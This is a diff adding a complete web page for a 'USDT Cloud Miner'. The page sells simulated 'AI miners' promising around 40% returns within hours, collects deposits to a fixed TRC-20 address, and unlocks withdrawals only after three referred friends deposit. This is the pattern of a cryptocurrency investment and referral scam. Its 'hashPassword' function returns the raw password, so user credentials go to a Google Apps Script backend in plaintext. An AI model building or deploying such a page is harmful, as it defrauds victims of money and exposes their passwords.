@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT Cloud Miner</title>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.20.15/babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background: linear-gradient(135deg, #1a202c, #2d3748); color: #e2e8f0; }
+    .neon-glow { box-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc; }
+    .exclusive-glow { box-shadow: 0 0 15px #ff00ff, 0 0 30px #ff00ff; border: 2px solid #ff00ff; }
+    .miner-card:hover { transform: scale(1.05); transition: transform 0.3s; }
+    .modal { backdrop-filter: blur(5px); }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+  <script type="text/babel">
+    const { useState, useEffect } = React;
+    const { createRoot } = ReactDOM;
+
+    const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbwPi5SXyRLE3VLjtO5iD6aMPIh7KwUc83GcQrnsMhtUSLx-MfvhfCzGfVhC7ESCj_D_/exec'; // Your Web App URL
+    const USDT_ADDRESS = 'TLq6qhGHBkzGcGAQaePq7zxdoMEiChqCQC';
+
+    const hashPassword = (password) => password;
+
+    const generateBotName = () => {
+      const prefixes = ['Quantum', 'Neura', 'Synth', 'Astro', 'Cypher', 'Nexus', 'Vortex', 'Pulse'];
+      const suffixes = ['Bot', 'AI', 'Core', 'Node', 'Spark', 'Wave', 'Drone', 'Flux'];
+      const randomNum = Math.floor(Math.random() * 1000);
+      return `${prefixes[Math.floor(Math.random() * prefixes.length)]}-${suffixes[Math.floor(Math.random() * suffixes.length)]}-${randomNum}`;
+    };
+
+    const generateMiners = () => {
+      const regularMiners = [];
+      const minPrice = 10;
+      const maxPrice = 250;
+      const roiSeconds = 24 * 3600; // 24 hours for regular miners
+      for (let price = minPrice; price <= maxPrice; price += 10) {
+        const speedMultiplier = 1 + (price - minPrice) / 50;
+        regularMiners.push({
+          id: price,
+          name: generateBotName(),
+          price,
+          speed: speedMultiplier.toFixed(2),
+          roiSeconds: roiSeconds,
+        });
+      }
+
+      // Add bonus miner
+      regularMiners.push({
+        id: 1000,
+        name: 'Bonus Turbo Miner',
+        price: 100,
+        speed: '2.00',
+        roiSeconds: 12 * 3600,
+        bonus: 60,
+      });
+
+      // Exclusive miners
+      const exclusiveMiners = [
+        {
+          id: 1001,
+          name: 'Exclusive Neon Miner',
+          price: 50,
+          speed: '3.00',
+          roiSeconds: 4 * 3600,
+          bonus: 30,
+          isExclusive: true,
+        },
+        {
+          id: 1002,
+          name: 'Exclusive Plasma Miner',
+          price: 100,
+          speed: '4.00',
+          roiSeconds: 4 * 3600,
+          bonus: 50,
+          isExclusive: true,
+        },
+      ];
+
+      return { exclusiveMiners, regularMiners };
+    };
+
+    const App = () => {
+      const [user, setUser] = useState(() => JSON.parse(localStorage.getItem('user')) || null);
+      const [wallet, setWallet] = useState(() => Number(localStorage.getItem('wallet')) || 0);
+      const [activeMiners, setActiveMiners] = useState(() => JSON.parse(localStorage.getItem('activeMiners')) || []);
+      const [showSignup, setShowSignup] = useState(false);
+      const [showLogin, setShowLogin] = useState(false);
+      const [showDeposit, setShowDeposit] = useState(false);
+      const [depositAmount, setDepositAmount] = useState('');
+      const [showDepositConfirmation, setShowDepositConfirmation] = useState(false);
+      const [minerCompleted, setMinerCompleted] = useState(() => localStorage.getItem('minerCompleted') === 'true');
+      const [referrals, setReferrals] = useState(() => JSON.parse(localStorage.getItem('referrals')) || []);
+      const [withdrawUnlocked, setWithdrawUnlocked] = useState(() => localStorage.getItem('withdrawUnlocked') === 'true');
+      const [showWithdraw, setShowWithdraw] = useState(false);
+      const [withdrawAddress, setWithdrawAddress] = useState('');
+      const [referralLink, setReferralLink] = useState('');
+      const [referrerEmail, setReferrerEmail] = useState(null);
+      const { exclusiveMiners, regularMiners } = generateMiners();
+
+      useEffect(() => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const refEmail = urlParams.get('ref');
+        if (refEmail) {
+          if (user) {
+            logout();
+          }
+          setReferrerEmail(refEmail);
+          setShowSignup(true);
+        }
+      }, []);
+
+      useEffect(() => {
+        if (user) {
+          fetch(GOOGLE_SHEETS_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'getBalance', email: user.email }),
+          })
+            .then((res) => res.json())
+            .then((data) => {
+              if (data.status === 'success') {
+                setWallet(data.balance);
+              } else {
+                alert('Get Balance failed: ' + (data.message || 'Unknown error'));
+              }
+            })
+            .catch((error) => {
+              alert('Get Balance error: ' + error.message);
+            });
+
+          fetch(GOOGLE_SHEETS_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'getReferrals', email: user.email }),
+          })
+            .then((res) => res.json())
+            .then((data) => {
+              if (data.status === 'success') {
+                setReferrals(data.referrals || []);
+              } else {
+                alert('Get Referrals failed: ' + (data.message || 'Unknown error'));
+              }
+            })
+            .catch((error) => {
+              alert('Get Referrals error: ' + error.message);
+            });
+
+          const baseUrl = window.location.origin;
+          setReferralLink(`${baseUrl}?ref=${encodeURIComponent(user.email)}`);
+        }
+      }, [user]);
+
+      useEffect(() => {
+        localStorage.setItem('user', JSON.stringify(user));
+        localStorage.setItem('wallet', wallet);
+        localStorage.setItem('activeMiners', JSON.stringify(activeMiners));
+        localStorage.setItem('minerCompleted', minerCompleted);
+        localStorage.setItem('referrals', JSON.stringify(referrals));
+        localStorage.setItem('withdrawUnlocked', withdrawUnlocked);
+      }, [user, wallet, activeMiners, minerCompleted, referrals, withdrawUnlocked]);
+
+      useEffect(() => {
+        const interval = setInterval(() => {
+          setActiveMiners((prev) => {
+            const updatedMiners = prev.map((miner) => {
+              const progress = miner.progress + (100 / miner.roiSeconds) * 2;
+              if (progress >= 100) {
+                const profit = miner.bonus ? miner.bonus : miner.price * 0.4;
+                const totalEarnings = miner.price + profit;
+                setWallet((w) => w + totalEarnings);
+                setMinerCompleted(true);
+                if (user) {
+                  fetch(GOOGLE_SHEETS_API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      action: 'deposit',
+                      email: user.email,
+                      amount: totalEarnings,
+                    }),
+                  })
+                    .then((res) => res.json())
+                    .then((data) => {
+                      if (data.status === 'success') {
+                        setWallet(data.balance);
+                      } else {
+                        alert('Deposit failed: ' + (data.message || 'Unknown error'));
+                      }
+                    })
+                    .catch((error) => {
+                      alert('Deposit error: ' + error.message);
+                    });
+                }
+                return null;
+              }
+              return { ...miner, progress };
+            });
+            return updatedMiners.filter((miner) => miner !== null);
+          });
+        }, 2000);
+        return () => clearInterval(interval);
+      }, [user]);
+
+      useEffect(() => {
+        const friendsWithDeposits = referrals.filter((ref) => ref.depositedAmount > 0).length;
+        if (minerCompleted && friendsWithDeposits >= 3) {
+          setWithdrawUnlocked(true);
+        } else {
+          setWithdrawUnlocked(false);
+        }
+      }, [minerCompleted, referrals]);
+
+      const handleSignup = (e) => {
+        e.preventDefault();
+        const email = e.target.email.value;
+        const password = e.target.password.value;
+        if (!email || !password) {
+          alert('Please fill in both email and password.');
+          return;
+        }
+        if (email === referrerEmail) {
+          alert('You cannot sign up with the same email as the referrer.');
+          return;
+        }
+        const passwordHash = hashPassword(password);
+        const payload = { action: 'signup', email, passwordHash, referrer: referrerEmail };
+        fetch(GOOGLE_SHEETS_API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.status === 'success') {
+              alert('Signup successful! Please login.');
+              setShowSignup(false);
+              setReferrerEmail(null);
+              window.history.replaceState({}, document.title, window.location.pathname);
+            } else {
+              alert('Signup failed: ' + (data.message || 'Unknown error'));
+            }
+          })
+          .catch((error) => {
+            alert('Signup error: ' + error.message);
+          });
+      };
+
+      const handleLogin = (e) => {
+        e.preventDefault();
+        const email = e.target.email.value;
+        const password = e.target.password.value;
+        if (!email || !password) {
+          alert('Please fill in both email and password.');
+          return;
+        }
+        const passwordHash = hashPassword(password);
+        const payload = { action: 'login', email, passwordHash };
+        fetch(GOOGLE_SHEETS_API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.status === 'success') {
+              setUser({ email });
+              setWallet(data.balance);
+              setShowLogin(false);
+              alert('Login successful!');
+              window.history.replaceState({}, document.title, window.location.pathname);
+            } else {
+              alert('Login failed: ' + (data.message || 'Unknown error'));
+            }
+          })
+          .catch((error) => {
+            alert('Login error: ' + error.message);
+          });
+      };
+
+      const handleDeposit = () => {
+        if (!depositAmount || parseFloat(depositAmount) <= 0) {
+          alert('Please enter a valid deposit amount.');
+          return;
+        }
+        const amount = parseFloat(depositAmount);
+        const payload = { action: 'depositRequest', email: user.email, amount };
+        fetch(GOOGLE_SHEETS_API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.status === 'success') {
+              setShowDepositConfirmation(true);
+            } else {
+              alert('Deposit request failed: ' + (data.message || 'Unknown error'));
+            }
+          })
+          .catch((error) => {
+            alert('Deposit request error: ' + error.message);
+          });
+      };
+
+      const handleWithdraw = (e) => {
+        e.preventDefault();
+        const amount = parseFloat(e.target.amount.value);
+        const address = e.target.address.value.trim();
+        if (amount <= 0) {
+          alert('Invalid amount');
+          return;
+        }
+        if (!address) {
+          alert('Please enter your USDT (TRC-20) address.');
+          return;
+        }
+        if (amount > wallet) {
+          alert('Insufficient balance');
+          return;
+        }
+        const payload = { action: 'withdraw', email: user.email, amount, address };
+        fetch(GOOGLE_SHEETS_API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.status === 'success') {
+              setWallet(data.balance);
+              setShowWithdraw(false);
+              setWithdrawAddress('');
+              alert('Withdrawal successful!');
+            } else {
+              alert('Withdrawal failed: ' + (data.message || 'Unknown error'));
+            }
+          })
+          .catch((error) => {
+            alert('Withdrawal error: ' + error.message);
+          });
+      };
+
+      const buyMiner = (miner) => {
+        if (!user) {
+          alert('Please login to purchase miners.');
+          return;
+        }
+        if (wallet >= miner.price) {
+          const payload = { action: 'purchase', email: user.email, amount: miner.price };
+          fetch(GOOGLE_SHEETS_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+          })
+            .then((res) => res.json())
+            .then((data) => {
+              if (data.status === 'success') {
+                setWallet(data.balance);
+                setActiveMiners([...activeMiners, { ...miner, progress: 0 }]);
+              } else {
+                alert('Purchase failed: ' + (data.message || 'Unknown error'));
+              }
+            })
+            .catch((error) => {
+              alert('Purchase error: ' + error.message);
+            });
+        } else {
+          alert('Insufficient USDT balance!');
+        }
+      };
+
+      const logout = () => {
+        setUser(null);
+        setWallet(0);
+        setShowWithdraw(false);
+        setWithdrawAddress('');
+        setReferralLink('');
+        setReferrerEmail(null);
+        localStorage.removeItem('user');
+        localStorage.setItem('wallet', 0);
+        window.history.replaceState({}, document.title, window.location.pathname);
+      };
+
+      const copyReferralLink = () => {
+        navigator.clipboard.writeText(referralLink);
+        alert('Referral link copied to clipboard!');
+      };
+
+      const copyUsdtAddress = () => {
+        navigator.clipboard.writeText(USDT_ADDRESS);
+        alert('USDT address copied to clipboard!');
+      };
+
+      return (
+        <div className="min-h-screen flex flex-col">
+          <header className="bg-gray-900 p-4 flex justify-between items-center">
+            <h1 className="text-2xl font-bold text-[#00ffcc]">USDT Cloud Miner</h1>
+            <div className="text-lg flex items-center space-x-4">
+              {user ? (
+                <>
+                  <span>Wallet: <span className="text-[#00ffcc]">{wallet.toFixed(2)} USDT</span></span>
+                  <button
+                    onClick={() => setShowDeposit(true)}
+                    className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    Deposit
+                  </button>
+                  <button
+                    onClick={() => setShowWithdraw(true)}
+                    className={`px-4 py-2 rounded ${
+                      withdrawUnlocked && minerCompleted
+                        ? 'bg-[#00ffcc] text-gray-900 hover:bg-[#00ccaa]'
+                        : 'bg-gray-500 text-gray-300 cursor-not-allowed'
+                    }`}
+                    disabled={!withdrawUnlocked || !minerCompleted}
+                    title={!withdrawUnlocked || !minerCompleted ? 'Complete a miner cycle and invite 3 friends who deposit to unlock withdrawal.' : ''}
+                  >
+                    Withdraw
+                  </button>
+                  <button
+                    onClick={logout}
+                    className="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600"
+                  >
+                    Logout
+                  </button>
+                </>
+              ) : (
+                <>
+                  <button
+                    onClick={() => setShowSignup(true)}
+                    className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    Signup
+                  </button>
+                  <button
+                    onClick={() => setShowLogin(true)}
+                    className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    Login
+                  </button>
+                </>
+              )}
+            </div>
+          </header>
+
+          {showSignup && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center modal">
+              <div className="bg-gray-800 p-6 rounded-lg w-full max-w-md">
+                <h2 className="text-2xl font-bold mb-4">Signup</h2>
+                {referrerEmail && (
+                  <p className="mb-4">Referred by: {referrerEmail}</p>
+                )}
+                <form onSubmit={handleSignup}>
+                  <div className="mb-4">
+                    <label className="block mb-1">Email</label>
+                    <input
+                      type="email"
+                      name="email"
+                      className="w-full p-2 bg-gray-700 rounded text-white"
+                      required
+                    />
+                  </div>
+                  <div className="mb-4">
+                    <label className="block mb-1">Password</label>
+                    <input
+                      type="password"
+                      name="password"
+                      className="w-full p-2 bg-gray-700 rounded text-white"
+                      required
+                    />
+                  </div>
+                  <div className="flex justify-end space-x-2">
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setShowSignup(false);
+                        setReferrerEmail(null);
+                        window.history.replaceState({}, document.title, window.location.pathname);
+                      }}
+                      className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-500"
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      type="submit"
+                      className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                    >
+                      Signup
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+          )}
+
+          {showLogin && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center modal">
+              <div className="bg-gray-800 p-6 rounded-lg w-full max-w-md">
+                <h2 className="text-2xl font-bold mb-4">Login</h2>
+                <form onSubmit={handleLogin}>
+                  <div className="mb-4">
+                    <label className="block mb-1">Email</label>
+                    <input
+                      type="email"
+                      name="email"
+                      className="w-full p-2 bg-gray-700 rounded text-white"
+                      required
+                    />
+                  </div>
+                  <div className="mb-4">
+                    <label className="block mb-1">Password</label>
+                    <input
+                      type="password"
+                      name="password"
+                      className="w-full p-2 bg-gray-700 rounded text-white"
+                      required
+                    />
+                  </div>
+                  <div className="flex justify-end space-x-2">
+                    <button
+                      type="button"
+                      onClick={() => setShowLogin(false)}
+                      className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-500"
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      type="submit"
+                      className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                    >
+                      Login
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+          )}
+
+          {showDeposit && !showDepositConfirmation && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center modal">
+              <div className="bg-gray-800 p-6 rounded-lg w-full max-w-md">
+                <h2 className="text-2xl font-bold mb-4">Deposit USDT</h2>
+                <p className="mb-4">Please send your USDT (TRC-20) to the following address:</p>
+                <div className="flex items-center mb-4">
+                  <input
+                    type="text"
+                    value={USDT_ADDRESS}
+                    readOnly
+                    className="w-full p-2 bg-gray-700 rounded text-white"
+                  />
+                  <button
+                    onClick={copyUsdtAddress}
+                    className="ml-2 bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    Copy
+                  </button>
+                </div>
+                <div className="mb-4">
+                  <label className="block mb-1">Amount (USDT)</label>
+                  <input
+                    type="number"
+                    value={depositAmount}
+                    onChange={(e) => setDepositAmount(e.target.value)}
+                    step="0.01"
+                    className="w-full p-2 bg-gray-700 rounded text-white"
+                    required
+                  />
+                </div>
+                <div className="flex justify-end space-x-2">
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setShowDeposit(false);
+                      setDepositAmount('');
+                    }}
+                    className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-500"
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={handleDeposit}
+                    className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    I Deposit
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showDeposit && showDepositConfirmation && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center modal">
+              <div className="bg-gray-800 p-6 rounded-lg w-full max-w-md">
+                <h2 className="text-2xl font-bold mb-4">Deposit Confirmation</h2>
+                <p className="mb-4">
+                  Your request is submitted and deposit amount is reflected into your account within 24 hours.
+                </p>
+                <div className="flex justify-end">
+                  <button
+                    onClick={() => {
+                      setShowDeposit(false);
+                      setShowDepositConfirmation(false);
+                      setDepositAmount('');
+                    }}
+                    className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    OK
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showWithdraw && withdrawUnlocked && minerCompleted && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center modal">
+              <div className="bg-gray-800 p-6 rounded-lg w-full max-w-md">
+                <h2 className="text-2xl font-bold mb-4">Withdraw USDT</h2>
+                <form onSubmit={handleWithdraw}>
+                  <div className="mb-4">
+                    <label className="block mb-1">Amount (USDT)</label>
+                    <input
+                      type="number"
+                      name="amount"
+                      step="0.01"
+                      className="w-full p-2 bg-gray-700 rounded text-white"
+                      required
+                    />
+                  </div>
+                  <div className="mb-4">
+                    <label className="block mb-1">USDT (TRC-20) Address</label>
+                    <input
+                      type="text"
+                      name="address"
+                      value={withdrawAddress}
+                      onChange={(e) => setWithdrawAddress(e.target.value)}
+                      className="w-full p-2 bg-gray-700 rounded text-white"
+                      placeholder="Enter your USDT (TRC-20) address"
+                      required
+                    />
+                  </div>
+                  <div className="flex justify-end space-x-2">
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setShowWithdraw(false);
+                        setWithdrawAddress('');
+                      }}
+                      className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-500"
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      type="submit"
+                      className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                    >
+                      Withdraw
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+          )}
+
+          <main className="flex-grow p-6">
+            {user && (
+              <section className="mb-12">
+                <h2 className="text-3xl font-semibold mb-6 text-center">Refer Friends</h2>
+                <div className="bg-gray-800 p-4 rounded-lg neon-glow">
+                  <p>Your Referral Link:</p>
+                  <input
+                    type="text"
+                    value={referralLink}
+                    readOnly
+                    className="w-full p-2 bg-gray-700 rounded text-white mb-2"
+                  />
+                  <button
+                    onClick={copyReferralLink}
+                    className="bg-[#00ffcc] text-gray-900 px-4 py-2 rounded hover:bg-[#00ccaa]"
+                  >
+                    Copy Link
+                  </button>
+                  <p className="mt-2">
+                    Friends with Deposits: {referrals.filter((ref) => ref.depositedAmount > 0).length}/3
+                  </p>
+                  {referrals.length > 0 && (
+                    <div className="mt-4">
+                      <h3 className="text-xl font-bold">Referral Status</h3>
+                      <ul>
+                        {referrals.map((ref, index) => (
+                          <li key={index}>
+                            {ref.invitedEmail}: {ref.depositedAmount > 0 ? `${ref.depositedAmount} USDT` : 'No Deposit Yet'}
+                          </li>
+                        ))}
+                      </ul>
+                    </div>
+                  )}
+                </div>
+              </section>
+            )}
+
+            <section className="mb-12">
+              <h2 className="text-3xl font-semibold mb-6 text-center">Choose Your AI Miner</h2>
+              <div className="mb-8">
+                <h3 className="text-2xl font-bold mb-4 text-center text-[#ff00ff]">Exclusive Miners</h3>
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                  {exclusiveMiners.map((miner) => {
+                    const profit = miner.bonus ? miner.bonus : (miner.price * 0.4).toFixed(2);
+                    const roiHours = miner.roiSeconds / 3600;
+                    return (
+                      <div
+                        key={miner.id}
+                        className="miner-card bg-gray-800 p-4 rounded-lg exclusive-glow"
+                      >
+                        <h3 className="text-xl font-bold text-[#ff00ff]">{miner.name}</h3>
+                        <p>Price: {miner.price} USDT</p>
+                        <p>Speed: {miner.speed}x</p>
+                        <p>ROI: {profit} USDT / {roiHours} hours</p>
+                        <button
+                          onClick={() => buyMiner(miner)}
+                          className="mt-4 w-full bg-[#ff00ff] text-gray-900 py-2 rounded hover:bg-[#cc00cc]"
+                        >
+                          Buy Now
+                        </button>
+                      </div>
+                    );
+                  })}
+                </div>
+              </div>
+
+              <h3 className="text-2xl font-bold mb-4 text-center">Regular Miners</h3>
+              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                {regularMiners.map((miner) => {
+                  const profit = miner.bonus ? miner.bonus : (miner.price * 0.4).toFixed(2);
+                  const roiHours = miner.roiSeconds / 3600;
+                  return (
+                    <div key={miner.id} className="miner-card bg-gray-800 p-4 rounded-lg neon-glow">
+                      <h3 className="text-xl font-bold">{miner.name}</h3>
+                      <p>Price: {miner.price} USDT</p>
+                      <p>Speed: {miner.speed}x</p>
+                      <p>ROI: {profit} USDT / {roiHours} hours</p>
+                      <button
+                        onClick={() => buyMiner(miner)}
+                        className="mt-4 w-full bg-[#00ffcc] text-gray-900 py-2 rounded hover:bg-[#00ccaa]"
+                      >
+                        Buy Now
+                      </button>
+                    </div>
+                  );
+                })}
+              </div>
+            </section>
+
+            <section>
+              <h2 className="text-3xl font-semibold mb-6 text-center">Your Active Miners</h2>
+              {activeMiners.length === 0 ? (
+                <p className="text-center text-gray-400">No active miners. Purchase one to start mining!</p>
+              ) : (
+                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+                  {activeMiners.map((miner, index) => (
+                    <div key={index} className="bg-gray-800 p-4 rounded-lg neon-glow">
+                      <h3 className="text-xl font-bold">{miner.name}</h3>
+                      <p>Price: {miner.price} USDT</p>
+                      <p>Progress: {miner.progress.toFixed(2)}%</p>
+                      <p>Time Remaining: {((100 - miner.progress) / 100 * miner.roiSeconds / 3600).toFixed(2)} hours</p>
+                      <div className="w-full bg-gray-600 rounded h-2 mt-2">
+                        <div
+                          className="bg-[#00ffcc] h-2 rounded"
+                          style={{ width: `${miner.progress}%` }}
+                        ></div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </section>
+          </main>
+
+          <footer className="bg-gray-900 p-4 text-center">
+            <p>© 2025 USDT Cloud Miner. All rights reserved.</p>
+          </footer>
+        </div>
+      );
+    };
+
+    const root = createRoot(document.getElementById('root'));
+    root.render(<App />);
+  </script>
+</body>
+</html>
